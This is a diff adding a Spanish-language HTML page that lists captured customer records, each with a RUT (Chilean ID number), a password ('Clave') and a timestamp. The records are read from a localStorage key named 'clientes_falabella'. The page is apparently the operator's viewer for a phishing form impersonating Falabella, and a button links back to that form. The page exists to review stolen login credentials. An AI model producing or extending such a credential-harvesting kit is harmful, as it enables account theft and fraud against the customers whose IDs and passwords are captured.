@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Registros de Clientes</title>
+    <style>
+        body { font-family: Arial; padding: 20px; background: #f4f4f4; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+        th, td { border: 1px solid #ccc; padding: 10px; text-align: left; }
+        th { background: #e60000; color: white; }
+        tr:nth-child(even) { background: #f9f9f9; }
+        .btn { background: #e60000; color: white; padding: 10px; text-decoration: none; border-radius: 5px; display: inline-block; margin-top: 20px; }
+    </style>
+</head>
+<body>
+
+<h1>Registros de Clientes (Solo tú puedes ver esto)</h1>
+
+<table id="tabla">
+    <thead>
+        <tr>
+            <th>RUT</th>
+            <th>Clave</th>
+            <th>Fecha y Hora</th>
+        </tr>
+    </thead>
+    <tbody></tbody>
+</table>
+
+<a href="index.html" class="btn">Volver al Formulario</a>
+
+<script>
+const registros = JSON.parse(localStorage.getItem("clientes_falabella") || "[]");
+const tbody = document.querySelector("#tabla tbody");
+
+if (registros.length === 0) {
+    tbody.innerHTML = "<tr><td colspan='3' style='text-align:center;'>No hay registros aún.</td></tr>";
+} else {
+    registros.forEach(r => {
+        const tr = document.createElement("tr");
+        tr.innerHTML = `
+            <td>${r.rut}</td>
+            <td><strong>${r.clave}</strong></td>
+            <td>${r.fecha}</td>
+        `;
+        tbody.appendChild(tr);
+    });
+}
+</script>
+
+</body>
+</html>
